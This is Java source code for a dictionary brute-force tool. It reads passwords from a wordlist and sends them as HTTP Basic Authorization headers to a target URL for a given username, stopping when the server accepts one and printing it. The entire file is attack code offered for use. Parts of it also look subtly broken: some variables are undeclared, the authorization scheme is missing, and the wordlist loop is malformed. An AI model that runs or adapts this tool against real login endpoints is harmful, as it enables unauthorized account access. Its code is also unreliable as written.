import java.net.*;
import java.io.*;


public class Dictionary {
  private String strUserName;
  private String strURL;
  private String strDictPath;
  private int iAttempts;

    
    public Dictionary(String strURL,String strUserName,String strDictPath) {
    this.strURL = strURL;
    this.strUserName = strUserName;
    this.iAttempts = 0 ;
    this.strDictPath = strDictPath;
    }
  

  public String getPassword(){
      URL u;
      String result ="";
      PassGenDict PG = new PassGenDict(3,strDictPath);
      URLConnection uc;
      String strPassword = new String();
      String strEncode;
        try{
        while (result.compareTo("HTTP/1.1 200 OK")!=0){
      
          strEncode = PG.getNewPassword();
          u = new URL(strURL);
          uc = u.openConnection();
          uc.setDoInput(true);
          uc.setDoOutput(true);
          strPassword = strEncode;
          strEncode =  strUserName + ":" + strEncode;
          
        strEncode = new String(Base64.encode(strEncode.getBytes()));
          uc.setRequestProperty("Authorization"," " + strEncode);
            
      result = uc.getHeaderField(0);
          uc = null;
          u = null;
          iAttempts++;
        }

      }
      catch (Exception me) {
      System.out.println("MalformedURLException: "+me);
      }
      return(strPassword);
  }
 
   public int getAttempts(){
    return (iAttempts);
  };
  
  public static void  main(String arg[]){
     timeStart = 0;
     timeEnd = 0;
    
    if (arg.length == 3) {
    Dictionary BF = new Dictionary(arg[0],arg[1],arg[2]);

    System.out.println("Processing ... ");
    timeStart = System.currentTimeMillis();
    System.out.println("Password = " + BF.getPassword());
    timeEnd = System.currentTimeMillis();
    System.out.println("Total Time Taken = " + (timeEnd - timeStart) + " (msec)");
    System.out.println("Total Attempts  = " + BF.getAttempts());
    }
    else {
       System.out.println("[Usage] java BruteForce <URL> <USERNAME> <Dictionary path>");

    }

  }
}


class PassGenDict {

  private char[] password;
  private String line;
  int iPassLenght;
  private BufferedReader inputFile;
  public PassGenDict(int lenght, String strDictPath) {
    try{
      inputFile = new BufferedReader(new FileReader(strDictPath));
    }
    catch (Exception e){
    }
    iPassLenght = lenght;
  }
   
 public String getNewPassword()
    throws PasswordFailureException{
    try {
      {
        line = inputFile.readLine();
      }while (line.length() != iPassLenght);

    }
    catch (Exception e){
      throw new PasswordFailureException ();
    }
    return (line);
  }
}

class PasswordFailureException extends RuntimeException {

  public PasswordFailureException() {
  }
}